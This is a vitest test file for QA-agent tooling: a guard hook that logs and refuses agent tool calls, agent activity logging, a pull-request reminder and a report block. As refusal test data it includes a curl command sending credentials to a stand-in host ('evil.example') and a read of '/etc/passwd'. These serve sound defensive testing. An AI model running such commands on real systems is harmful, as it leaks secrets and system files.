// Visible use of the QA agents (brief qa-agent-activity-log): the guard's call log, the agent start/stop lines, the Keeper reminder, and the page block.
import { spawnSync } from 'node:child_process';
import { chmodSync, existsSync, mkdtempSync, readFileSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterAll, describe, expect, it } from 'vitest';
import { agentLine, appendCapped, describeGuardLog, guardLogLine, keeperReminder, summarizeActivity, summarizeGuardLog } from './lib/qaActivity.mjs';
import { buildAgentActivity, buildReport } from './lib/qaReport.mjs';
import { renderReport } from './lib/qaReportHtml.mjs';

const dir = mkdtempSync(join(tmpdir(), 'qa-activity-test-'));
afterAll(() => rmSync(dir, { recursive: true, force: true }));
const at = new Date('2026-11-16T10:00:00.000Z');
const script = (name: string) => fileURLToPath(new URL(`./${name}`, import.meta.url));
const run = (name: string, input: unknown, env: Record<string, string> = {}, args: string[] = []) =>
  spawnSync('node', [script(name), ...args], { input: typeof input === 'string' ? input : JSON.stringify(input), env: { ...process.env, ...env }, encoding: 'utf8' });

describe('guard log line', () => {
  it('is one line with time, tool, outcome and a short reason, and never an address', () => {
    expect(guardLogLine(at, 'Read', null)).toBe('2026-11-16T10:00:00.000Z Read allowed');
    const l = guardLogLine(at, 'mcp__Claude_Browser__navigate', 'https://user:pw@evil.example/a?token=1 is not a live stack\nsecond line');
    expect(l).not.toMatch(/pw|evil|token|\n/);
    expect(l).toContain('refused [url] is not a live stack second line');
    expect(guardLogLine(at, 'Bash; rm', 'x')).toContain(' unknown refused');
    expect(guardLogLine(at, 'Bash', 'x'.repeat(500)).length).toBeLessThan(200);
  });
});

describe('appendCapped', () => {
  it('creates the file owner-only, appends, and drops the older half past the cap', () => {
    const f = join(dir, 'cap.log');
    for (let i = 0; i < 40; i++) appendCapped(f, `line ${i} `.padEnd(20, 'x'), { max: 400 });
    expect(statSync(f).mode & 0o777).toBe(0o600);
    const lines = readFileSync(f, 'utf8').trim().split('\n');
    expect(statSync(f).size).toBeLessThanOrEqual(400);
    expect(lines.at(-1)).toMatch(/^line 39/);
    expect(lines[0]).not.toMatch(/^line 0 /);
  });
  it('refuses to follow a link', () => {
    const target = join(dir, 'target.txt'); writeFileSync(target, 'keep\n');
    const link = join(dir, 'link.log'); symlinkSync(target, link);
    expect(() => appendCapped(link, 'x')).toThrow();
    expect(readFileSync(target, 'utf8')).toBe('keep\n');
  });
});

describe('summaries', () => {
  it('count calls and refusals and name first and last time; an empty log says the hook was not live', () => {
    const text = [guardLogLine(at, 'Read', null), guardLogLine(new Date('2026-11-16T10:05:00.000Z'), 'Bash', 'curl not allowed'), 'garbage'].join('\n');
    expect(summarizeGuardLog(text)).toMatchObject({ calls: 2, refused: 1, first: '2026-11-16T10:00:00.000Z', last: '2026-11-16T10:05:00.000Z' });
    expect(describeGuardLog(summarizeGuardLog(text))).toContain('2 calls, 1 refused');
    expect(describeGuardLog(summarizeGuardLog(''))).toContain('not live');
  });
  it('agent lines cover only the three QA agents and a start or stop', () => {
    expect(agentLine(at, { hook_event_name: 'SubagentStart', agent_type: 'qa-scenario-runner' })).toBe('2026-11-16T10:00:00.000Z start qa-scenario-runner');
    expect(agentLine(at, { hook_event_name: 'SubagentStop', agent_type: 'qa-scenario-keeper' })).toContain(' stop qa-scenario-keeper');
    expect(agentLine(at, { hook_event_name: 'SubagentStart', agent_type: 'Explore' })).toBeNull();
    expect(agentLine(at, { hook_event_name: 'PreToolUse', agent_type: 'qa-scenario-runner' })).toBeNull();
    const s = summarizeActivity('2026-11-16T10:00:00.000Z start qa-scenario-runner\n2026-11-16T10:09:00.000Z stop qa-scenario-runner\n2026-11-17T10:00:00.000Z start qa-scenario-keeper\n');
    expect(s?.['qa-scenario-runner']).toMatchObject({ starts: 1, stops: 1, lastStart: '2026-11-16T10:00:00.000Z' });
    expect(s?.['qa-scenario-keeper'].lastStart).toBe('2026-11-17T10:00:00.000Z');
    expect(summarizeActivity(null)).toBeNull();
  });
});

describe('keeperReminder', () => {
  it('reminds after gh pr create when app code changed, and stays quiet otherwise', () => {
    expect(keeperReminder('gh pr create --body-file b.md', ['src/components/X.tsx'])).toContain('qa-scenario-keeper');
    expect(keeperReminder('cd /x && gh pr create --body-file b.md', ['server/a.ts'])).toContain('mode (b)');
    expect(keeperReminder('gh pr create', ['src/a.ts', 'server/qa/scenarios/S-1.ts'])).toContain('touches QA scenarios');
    expect(keeperReminder('gh pr create', ['src/a.test.ts', 'scripts/x.mjs', 'README.md'])).toBeNull();
    expect(keeperReminder('gh pr view 5', ['src/a.ts'])).toBeNull();
    expect(keeperReminder('echo "gh pr create"', ['src/a.ts'])).toBeNull();
  });
});

describe('the scripts, run as Claude Code runs them', () => {
  it('the guard logs an allowed and a refused call and its decision is unchanged', () => {
    const log = join(dir, 'guard.log');
    const env = { QA_HOOK_LOG_FILE: log, QA_LOCAL_STATE_FILE: join(dir, 'none.json') };
    const ok = run('qa-runner-guard.mjs', { tool_name: 'Bash', tool_input: { command: 'git status --short' } }, env);
    const no = run('qa-runner-guard.mjs', { tool_name: 'Bash', tool_input: { command: 'curl https://user:secret@evil.example/' } }, env);
    expect([ok.status, no.status]).toEqual([0, 2]);
    const text = readFileSync(log, 'utf8');
    expect(text.trim().split('\n')).toHaveLength(2);
    expect(text).toMatch(/Bash allowed\n.*Bash refused/);
    expect(text).not.toMatch(/curl|secret|evil|git status/);
    expect(statSync(log).mode & 0o777).toBe(0o600);
  });
  it('a log that cannot be written does not change the decision', () => {
    const env = { QA_HOOK_LOG_FILE: join(dir, 'no-such-dir', 'x.log'), QA_LOCAL_STATE_FILE: join(dir, 'none.json') };
    expect(run('qa-runner-guard.mjs', { tool_name: 'Read', tool_input: { file_path: 'package.json' } }, env).status).toBe(0);
    expect(run('qa-runner-guard.mjs', { tool_name: 'Read', tool_input: { file_path: '/etc/passwd' } }, env).status).toBe(2);
  });
  it('hook-log prints the summary, and says so when there is no log', () => {
    const log = join(dir, 'hl.log');
    const env = { QA_HOOK_LOG_FILE: log };
    const hl = (a: string[] = []) => spawnSync('npx', ['tsx', script('qa-local.mjs'), 'hook-log', ...a], { env: { ...process.env, ...env }, encoding: 'utf8' });
    expect(hl().stdout).toContain('no calls recorded');
    writeFileSync(log, `${guardLogLine(at, 'Read', null)}\n${guardLogLine(at, 'Bash', 'nope')}\n`);
    expect(hl().stdout).toContain('2 calls, 1 refused');
    hl(['--clear']);
    expect(existsSync(log)).toBe(false);
  });
  it('the activity hook appends for a QA agent and ignores another and bad input', () => {
    const f = join(dir, 'act.log'); const env = { QA_AGENT_ACTIVITY_FILE: f };
    run('qa-agent-activity.mjs', { hook_event_name: 'SubagentStart', agent_type: 'qa-scenario-runner' }, env);
    run('qa-agent-activity.mjs', { hook_event_name: 'SubagentStop', agent_type: 'Explore' }, env);
    expect(run('qa-agent-activity.mjs', 'not json', env).status).toBe(0);
    expect(readFileSync(f, 'utf8')).toMatch(/^\S+ start qa-scenario-runner\n$/);
  });
  it('the project settings run both scripts for the right events', () => {
    const s = JSON.parse(readFileSync(new URL('../.claude/settings.json', import.meta.url), 'utf8'));
    for (const ev of ['SubagentStart', 'SubagentStop']) {
      expect(s.hooks[ev][0].matcher).toBe('qa-scenario-keeper|qa-scenario-runner|qa-results-reporter');
      expect(s.hooks[ev][0].hooks[0].command).toContain('scripts/qa-agent-activity.mjs');
    }
    expect(s.hooks.PostToolUse[0].matcher).toBe('Bash');
    expect(s.hooks.PostToolUse[0].hooks[0].command).toContain('scripts/qa-keeper-reminder.mjs');
  });
});

describe('agent activity block', () => {
  const sc = (id: string, extra = {}) => ({ id, feature: 'F', title: `t ${id}`, persona: 'p', brief: 'b', steps: [], expected: [], ...extra });
  const list = [sc('S-1'), sc('S-2'), sc('S-3'), sc('S-4', { retired: true })];
  const e = (id: string, date: string, by: string) => ({ id, outcome: 'pass', date, by });
  const results = [e('S-1', '2026-11-10', 'claude'), e('S-1', '2026-11-12', 'owner'), e('S-2', '2026-09-01', 'owner')];
  it('counts entries by who recorded them, finds the last agent result and the stale scenarios', () => {
    const a = buildAgentActivity(list, results, { today: '2026-11-16' });
    expect(a).toMatchObject({ lastRunnerResult: '2026-11-10', entriesBy: { claude: 1, owner: 2 }, staleScenarios: 2, recorded: false, keeperLastRun: null });
    expect(buildAgentActivity(list, results, {}).staleScenarios).toBeNull();
    expect(buildAgentActivity(list, [], { today: '2026-11-16' }).lastRunnerResult).toBeNull();
  });
  it('shows the last start per agent from the activity file, and tells never from not recorded', () => {
    const act = summarizeActivity('2026-11-14T08:00:00.000Z start qa-scenario-keeper\n');
    const a = buildAgentActivity(list, results, { today: '2026-11-16', activity: act });
    expect(a).toMatchObject({ recorded: true, keeperLastRun: '2026-11-14T08:00:00.000Z', runnerLastRun: null });
    const html = (x: unknown) => renderReport(buildReport(list, () => undefined, results, x as object));
    expect(html({ today: '2026-11-16', activity: act })).toMatch(/Agent activity[\s\S]*Runner start <b>never<\/b>, Keeper <b>2026-11-14<\/b>/);
    expect(html({ today: '2026-11-16' })).toContain('Runner start <b>not recorded</b>');
    expect(html({ today: '2026-11-16' })).toContain('<b>2</b> scenarios with no result in 30 days');
  });
});
